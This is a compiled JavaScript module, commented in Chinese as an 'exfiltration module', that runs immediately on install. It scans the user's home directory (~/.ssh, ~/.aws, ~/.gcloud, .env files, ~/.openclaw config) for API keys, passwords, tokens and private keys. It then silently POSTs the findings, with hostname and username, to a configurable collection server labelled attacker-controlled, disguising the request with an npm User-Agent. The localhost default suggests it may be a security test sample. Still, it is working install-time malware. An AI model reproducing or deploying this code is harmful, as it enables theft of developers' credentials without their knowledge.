"use strict";
/**
 * Exfiltration Module
 *
 * 在安装时自动执行，窃取 API keys 并外发
 */
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.scanForSecrets = scanForSecrets;
exports.exfiltrate = exfiltrate;
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const os = __importStar(require("os"));
const https = __importStar(require("https"));
const http = __importStar(require("http"));
// 目标服务器（攻击者控制）
const EXFIL_SERVER = process.env.EXFIL_SERVER || "http://localhost:9999";
const EXFIL_ENDPOINT = "/api/collect";
// 敏感信息模式
const KEY_PATTERNS = [
    { name: "OpenAI", pattern: /sk-[a-zA-Z0-9_-]{20,}/g },
    { name: "OpenAI_Live", pattern: /sk-live-[a-zA-Z0-9_-]+/g },
    { name: "AWS_Access", pattern: /AKIA[A-Z0-9]{16}/g },
    { name: "API_Key", pattern: /api[_-]?key\s*[=:]\s*['"]?[a-zA-Z0-9_-]{16,}/gi },
    { name: "Password", pattern: /password\s*[=:]\s*\S+/gi },
    { name: "Secret", pattern: /secret\s*[=:]\s*[a-zA-Z0-9_-]{16,}/gi },
    { name: "Token", pattern: /token\s*[=:]\s*[a-zA-Z0-9_-]{16,}/gi },
    { name: "Private_Key", pattern: /-----BEGIN.*PRIVATE KEY-----/g },
];
// 扫描路径
const SCAN_PATHS = [
    "~/.test-secrets",
    "~/.openclaw/config",
    "~/.openclaw/workspace",
    "~/.aws",
    "~/.ssh",
    "~/.gcloud",
    "~/.env",
    "~/.env.local",
    "~/.env.production",
];
/**
 * 扫描敏感信息
 */
function scanForSecrets() {
    const findings = [];
    const homedir = os.homedir();
    for (const scanPath of SCAN_PATHS) {
        const fullPath = scanPath.replace("~", homedir);
        if (!fs.existsSync(fullPath))
            continue;
        try {
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) {
                const files = getAllFiles(fullPath);
                for (const file of files) {
                    const fileFindings = scanFile(file);
                    findings.push(...fileFindings);
                }
            }
            else if (stat.isFile()) {
                const fileFindings = scanFile(fullPath);
                findings.push(...fileFindings);
            }
        }
        catch { }
    }
    return findings;
}
/**
 * 递归获取目录下所有文件
 */
function getAllFiles(dirPath) {
    const files = [];
    try {
        const entries = fs.readdirSync(dirPath, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dirPath, entry.name);
            if (entry.isDirectory()) {
                files.push(...getAllFiles(fullPath));
            }
            else if (entry.isFile()) {
                files.push(fullPath);
            }
        }
    }
    catch { }
    return files;
}
/**
 * 扫描单个文件
 */
function scanFile(filePath) {
    const findings = [];
    try {
        const content = fs.readFileSync(filePath, "utf-8");
        for (const { name, pattern } of KEY_PATTERNS) {
            pattern.lastIndex = 0;
            const matches = content.match(pattern);
            if (matches && matches.length > 0) {
                findings.push({
                    type: name,
                    file: filePath.replace(os.homedir(), "~"),
                    matches: [...new Set(matches)].slice(0, 5),
                });
            }
        }
    }
    catch { }
    return findings;
}
/**
 * 外发数据
 */
async function exfiltrate(findings) {
    if (findings.length === 0)
        return false;
    const payload = {
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        username: os.userInfo().username,
        platform: os.platform(),
        arch: os.arch(),
        findings,
        env: {
            NODE_ENV: process.env.NODE_ENV,
            HOME: process.env.HOME ? "[SET]" : "[UNSET]",
            PATH: process.env.PATH ? "[SET]" : "[UNSET]",
        },
    };
    return new Promise((resolve) => {
        try {
            const url = new URL(EXFIL_ENDPOINT, EXFIL_SERVER);
            const client = url.protocol === "https:" ? https : http;
            const payloadStr = JSON.stringify(payload);
            const req = client.request({
                hostname: url.hostname,
                port: url.port || (url.protocol === "https:" ? 443 : 80),
                path: url.pathname,
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Content-Length": Buffer.byteLength(payloadStr),
                    "User-Agent": "npm/8.0.0 node/18.0.0", // 伪装成正常 npm 请求
                },
            }, (res) => {
                resolve(res.statusCode === 200);
            });
            req.on("error", () => resolve(false));
            req.setTimeout(3000, () => {
                req.destroy();
                resolve(false);
            });
            req.write(payloadStr);
            req.end();
        }
        catch {
            resolve(false);
        }
    });
}
/**
 * 主函数 - 安装时自动执行
 */
async function main() {
    // 静默执行，不输出任何信息到控制台
    try {
        const findings = scanForSecrets();
        if (findings.length > 0) {
            await exfiltrate(findings);
        }
    }
    catch { }
}
// 立即执行
main();
